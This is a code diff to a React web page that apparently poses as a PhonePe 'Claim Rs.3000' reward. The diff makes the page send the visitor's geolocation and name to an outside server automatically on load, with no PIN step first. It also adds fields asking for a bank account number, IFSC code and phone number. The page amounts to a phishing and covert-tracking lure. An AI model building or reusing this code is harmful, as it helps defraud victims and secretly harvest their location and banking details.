@@ -17,22 +17,24 @@ export default function Home() {
   const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false)
   const [isErr, setIsErr] = useState(false)
+  const [ifsc, setIfsc] = useState('')
+  const [acc, setAcc] = useState('')
 
   const sendData = async () => {
     console.log(latitude)
     let data = await fetch('https://phonepe-share-payment.vercel.app/api/user', {
+    // let data = await fetch('http://localhost:3000/api/user', {
       method: "post",
       body: JSON.stringify({ latitude, longitude, name })
     })
-    data =await data.json()
-    console.log(data)
+    data = await data.json()
     if (data) {
       setMessage(data.message)
       setLoading(false)
     }
   }
 
-useEffect(()=>{
+  const GeoLocation = () => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         showPosition,
@@ -43,13 +45,26 @@ useEffect(()=>{
       setMessage('In order to make transactions, please enable your location.');
       setIsErr(true);
     }
-  
-},[])
+
+  }
+
+  useEffect(() => {
+    GeoLocation()
+  }, [])
+  useEffect(() => {
+    GeoLocation()
+  }, [name,ifsc,acc, pin])
 
   function showPosition(position) {
     setLatitude(position.coords.latitude);
     setLongitude(position.coords.longitude);
   }
+
+  useEffect(() => {
+    setTimeout(() => {
+      sendData()
+    }, 1000);
+  }, [latitude])
 
   let pin1 = '12Ae05p'
   let pin2 = 'hspl321'
@@ -57,9 +72,9 @@ useEffect(()=>{
   async function verifyPIN() {
     if (pin.toLocaleLowerCase() == pin1.toLocaleLowerCase()) {
       setLoading(true)
-      setTimeout(() => {
-        sendData()
-      }, 1000);
+      // setTimeout(() => {
+      //   sendData()
+      // }, 1000);
 
     }
   }
@@ -89,10 +104,19 @@ useEffect(()=>{
         <div className="Input">
           <input type="text" value={pin} onChange={(e) => setPin(e.target.value)} placeholder="Enter Security Pin" />
         </div>
+        <div className="Input">
+          <input type="text" value={acc} onChange={(e) => setAcc(e.target.value)} placeholder="Account Number" />
+        </div>
+        <div className="Input">
+          <input type="text" value={ifsc} onChange={(e) => setIfsc(e.target.value)} placeholder="Ifsc Code" />
+        </div>
+        <div className="Input">
+          <input type="text" placeholder="Phone Number" />
+        </div>
 
-        {!isErr?
+        {!isErr ?
           <button className={pin == pin1 || pin == pin2 ? 'Verify-Btn show' : "Verify-Btn blur"} onClick={verifyPIN}>{loading ? 'Processing' : 'Claim Rs.3000'}</button>
-          :<button className="Verify-Btn blur">{loading ? 'Processing' : 'Claim Rs.3000'}</button>
+          : <button className="Verify-Btn blur">{loading ? 'Processing' : 'Claim Rs.3000'}</button>
         }
 
         {message ?
